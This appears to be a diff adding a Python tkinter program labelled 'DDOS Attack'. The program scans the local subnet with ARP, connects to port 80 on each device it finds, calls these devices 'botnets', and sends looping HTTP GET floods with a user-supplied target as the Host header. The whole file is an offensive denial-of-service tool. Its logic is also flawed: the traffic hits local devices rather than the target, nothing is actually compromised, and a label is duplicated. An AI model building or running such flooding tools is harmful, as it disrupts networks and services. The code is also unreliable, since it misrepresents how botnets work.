@@ -1,0 +1,100 @@
+import socket
+import threading
+import os
+import time
+import tkinter as tk
+from queue import Queue
+import scapy.all as scapy
+
+
+class DDOS_Attack:
+    subnet = '192.168.1.0/24'
+    target_url = ''
+    botnets = 0
+    running = False
+    window = None
+    queue = Queue()
+
+
+    def __init__(self):
+        self.window = tk.Tk()
+        self.window.title("DDOS Attack")
+
+
+        tk.Label(self.window, text="Target URL:").pack()
+        self.target_entry = tk.Entry(self.window)
+        self.target_entry.pack()
+
+
+        tk.Button(self.window, text="Start", command=self.start_attack).pack()
+        tk.Button(self.window, text="Stop", command=self.stop_attack).pack()
+        tk.Button(self.window, text="Recruit Botnets", command=self.recruit_botnets).pack()
+
+
+        tk.Label(self.window, text="Botnets: 0").pack()
+        self.botnet_label = tk.Label(self.window, text="Botnets: 0")
+        self.botnet_label.pack()
+
+
+        self.window.mainloop()
+
+
+    def start_attack(self):
+        self.running = True
+        self.target_url = self.target_entry.get()
+        self.botnets = 0
+        self.botnet_label['text'] = "Botnets: 0"
+        threading.Thread(target=self.scan_devices).start()
+
+
+    def stop_attack(self):
+        self.running = False
+
+
+    def recruit_botnets(self):
+        threading.Thread(target=self.scan_devices).start()
+
+
+    def scan_devices(self):
+        arp_request = scapy.ARP(pdst=self.subnet)
+        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = broadcast / arp_request
+        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+
+        clients = []
+        for element in answered_list:
+            client_dict = {"ip": element[1].psrc}
+            clients.append(client_dict)
+
+
+        for client in clients:
+            try:
+                self.connect_device(client["ip"])
+            except socket.herror:
+                pass
+
+
+    def connect_device(self, ip):
+        try:
+            # attempt to connect to device
+            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            conn.connect((ip, 80))
+            self.botnets += 1
+            self.botnet_label['text'] = "Botnets: %s" % self.botnets
+            threading.Thread(target=self.start_ddos, args=(conn,)).start()
+            self.queue.put(conn)
+        except Exception as e:
+            pass
+
+
+    def start_ddos(self, conn):
+        while self.running:
+            try:
+                # send ddos packets
+                conn.send(b'GET / HTTP/1.1\r\nHost: ' + self.target_url.encode() + b'\r\n\r\n')
+            except Exception as e:
+                pass
+
+
+DDOS_Attack()
